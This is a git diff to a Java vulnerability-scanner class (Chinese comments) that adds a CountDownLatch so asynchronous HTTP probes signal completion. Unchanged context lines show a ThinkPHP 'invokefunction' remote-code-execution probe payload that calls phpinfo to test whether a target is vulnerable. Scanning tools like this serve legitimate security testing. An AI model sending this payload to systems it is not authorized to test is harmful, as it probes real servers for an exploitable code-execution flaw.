@@ -7,6 +7,7 @@ import java.io.IOException;
 import java.lang.reflect.Method;
 import java.util.ArrayList;
 import java.util.HashMap;
+import java.util.concurrent.CountDownLatch;
 
 /**
  * 通用漏洞扫描类，里面包含不同通用漏洞的poc方法
@@ -23,7 +24,8 @@ public class UniversalScan
             OkHttpClient okHttpClient,
             String targetUrl,
             HashMap<String,Boolean> resultHashMap,
-            Method method
+            Method method,
+            CountDownLatch latch
     )
     {
         String payload="/index.php?s=index%2f\\think\\app%2finvokefunction&function=phpinfo&vars[0]=100";
@@ -41,6 +43,7 @@ public class UniversalScan
             public void onFailure(@NotNull Call call, @NotNull IOException e)
             {
                 System.out.println(targetUrl+"测试"+method.getName()+"漏洞时，连接异常！");
+                latch.countDown();
             }
 
             @Override
@@ -51,10 +54,12 @@ public class UniversalScan
                 {
                     resultHashMap.replace(method.getName(),true);
                     System.out.println(targetUrl+"存在"+method.getName()+"漏洞");
+                    latch.countDown();
                 }
                 else
                 {
                     System.out.println(targetUrl+"不存在"+method.getName()+"漏洞");
+                    latch.countDown();
                 }
             }
         });
@@ -114,8 +119,12 @@ public class UniversalScan
      * @param okHttpClient
      * @param str
      */
-    public void testPrint(OkHttpClient okHttpClient,String str,HashMap<String,Boolean> resultHashMap,
-                          Method method)
+    public void testPrint(
+            OkHttpClient okHttpClient,
+            String str,
+            HashMap<String,Boolean> resultHashMap,
+            Method method,
+            CountDownLatch latch)
     {
         try
         {
@@ -127,5 +136,6 @@ public class UniversalScan
         }
         resultHashMap.replace(method.getName(),true);  //测试能否加载多个插件，并且将正确的值赋值给成员
         System.out.println("测试反射调用方法打印成功！"+str);
+        latch.countDown();
     }
 }
